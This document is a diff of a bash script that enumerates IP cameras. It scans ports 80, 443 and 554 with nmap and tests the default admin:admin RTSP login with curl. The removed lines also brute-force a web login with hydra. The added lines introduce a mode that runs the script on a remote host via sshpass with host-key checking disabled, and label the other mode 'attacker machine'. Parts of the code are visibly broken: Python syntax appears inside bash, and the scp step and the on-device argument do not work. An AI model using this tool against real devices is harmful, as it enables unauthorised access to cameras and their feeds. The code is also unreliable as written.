@@ -1,19 +1,65 @@
 #!/usr/bin/env bash
 # camera_enum.sh
-# 1. ONVIF & RTSP Camera Enumerator
-# Scans ONVIF, RTSP, HTTP ports on IP cameras and tries default creds.
-# Usage: ./camera_enum.sh
-# Requires: nmap, curl, hydra
+# Adapted with remote-vs-local execution: remote scan vs on-device via SSH
+# Usage: ./ camera_enum.sh
+# Requires appropriate tools depending on mode
 
-function detect_os() { case "$(uname -s)" in Linux*) echo "linux";; Darwin*) echo "darwin";; *) echo "unknown";; esac; }
-function ensure_tool() { local t=$1; command -v "$t" &>/dev/null || { echo "[!] Installing $t..."; if [[ "$(detect_os)"=="darwin" ]]; then osascript -e 'tell app "Terminal" to do script "brew install '"$t"'"'; else os.system("sudo apt-get update && sudo apt-get install -y " + t); fi; }; }
-function get_credentials() { read -rp "Enter camera IP: " TARGET; }
+function detect_os() {
+  case "$(uname -s)" in
+    Linux*) echo "linux";;
+    Darwin*) echo "darwin";;
+    *) echo "unknown";;
+  esac
+}
 
-ensure_tool nmap
+function ensure_tool() {
+  local t=$1
+  if ! command -v "$t" &>/dev/null; then
+    echo "[!] $t not found, attempting install"
+    if [[ "$(detect_os)" == "darwin" ]]; then
+      brew install "$t"
+    elif [[ "$(detect_os)" == "linux" ]]; then
+      sudo apt-get update && sudo apt-get install -y "$t"
+    else
+      echo "Unsupported OS for install: $t"; exit 1
+    fi
+  fi
+}
+
+function remote_scan() {
+  read -rp "Camera IP: " TARGET
+nmap -p80,443,554 --script=banner -oN camera_ports_${TARGET}.txt "$TARGET"
+curl -v rtsp://admin:admin@"${TARGET}":554 2>&1 | grep "200 OK" && echo "Default RTSP creds working"
+
+}
+
+function remote_ssh_execute() {
+  local host="$SSH_HOST"
+  local user="$SSH_USER"
+  local pass="$SSH_PASS"
+  echo "[*] Copying script and executing on-device via SSH"
+  scp "$0" "$user@$host:/tmp/camera_enum.sh"
+  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$host" "bash /tmp/camera_enum.sh on-device"
+}
+
+# Main
+echo "Select mode:"
+echo "1) Remote scan from attacker machine"
+echo "2) Run on-device via SSH"
+read -rp "Choice [1/2]: " MODE
+
+if [[ "$MODE" == "2" ]]; then
+  read -rp "SSH host: " SSH_HOST
+  read -rp "SSH user: " SSH_USER
+  read -rsp "SSH password: " SSH_PASS
+  echo
+  ensure_tool sshpass
+  remote_ssh_execute
+  exit 0
+else
+  # perform remote scan
+  ensure_tool nmap
 ensure_tool curl
-ensure_tool hydra
-get_credentials
-
-nmap -p80,443,554 -sV --script=banner -oN camera_ports_${TARGET}.txt "$TARGET"
-curl -v rtsp://admin:admin@"$TARGET":554 2>&1 | grep "200 OK" && echo "Default RTSP creds admin:admin working"
-hydra -L users.txt -P passwords.txt http-get-form "${TARGET}/login:username=^USER^&password=^PASS^:F=Login failed" -o camera_http_creds.txt
+  remote_scan
+  exit 0
+fi
